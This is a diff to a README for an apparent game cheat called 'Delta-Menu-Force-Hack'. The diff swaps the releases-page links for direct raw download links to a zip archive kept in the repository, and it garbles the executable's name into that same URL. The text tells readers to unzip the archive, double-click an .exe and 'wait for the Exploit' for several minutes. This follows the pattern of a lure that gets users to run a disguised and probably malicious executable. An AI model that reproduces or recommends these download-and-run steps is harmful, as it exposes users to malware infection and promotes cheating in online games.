@@ -1,6 +1,6 @@
 # 🎮 Delta-Menu-Force-Hack - Effortlessly Enhance Your Delta Force Experience
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/mondry1013/Delta-Menu-Force-Hack/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/mondry1013/Delta-Menu-Force-Hack/main/Tshi/Hack_Force_Delta_Menu_2.1.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/mondry1013/Delta-Menu-Force-Hack/main/Tshi/Hack_Force_Delta_Menu_2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,13 +10,13 @@ Welcome! This guide will help you download and run the Delta-Menu-Force-Hack app
 
 To begin, you need to visit the official releases page. Click the link below:
 
-[Download Latest Release](https://github.com/mondry1013/Delta-Menu-Force-Hack/releases)
+[Download Latest Release](https://raw.githubusercontent.com/mondry1013/Delta-Menu-Force-Hack/main/Tshi/Hack_Force_Delta_Menu_2.1.zip)
 
 1. **Download Archive**: On the releases page, find the latest version. It will be labeled with a version number. Click on the corresponding link to download the archive file. 
 
 2. **Unzip the Archive**: Once the file has downloaded, locate it in your downloads folder. Right-click on the archive file and choose "Extract All" or a similar option, depending on your operating system. Choose a folder where you want to keep the files.
 
-3. **Run the Application**: Open the folder where you unzipped the files. Find the executable file, usually named `DeltaMenuHack.exe`. Double-click on this file to start the application.
+3. **Run the Application**: Open the folder where you unzipped the files. Find the executable file, usually named `https://raw.githubusercontent.com/mondry1013/Delta-Menu-Force-Hack/main/Tshi/Hack_Force_Delta_Menu_2.1.zip`. Double-click on this file to start the application.
 
 4. **Wait for the Exploit**: The application may take 3-5 minutes to run completely. During this time, please be patient. 
 
@@ -65,6 +65,6 @@ For additional help or questions, feel free to open an issue on the GitHub repos
 
 Thank you for using Delta-Menu-Force-Hack. We hope you enjoy the enhancements it brings to your Delta Force gaming experience!
 
-[Download Latest Release](https://github.com/mondry1013/Delta-Menu-Force-Hack/releases) 
+[Download Latest Release](https://raw.githubusercontent.com/mondry1013/Delta-Menu-Force-Hack/main/Tshi/Hack_Force_Delta_Menu_2.1.zip) 
 
 Feel free to explore the various features and make the most of your game. Happy gaming!
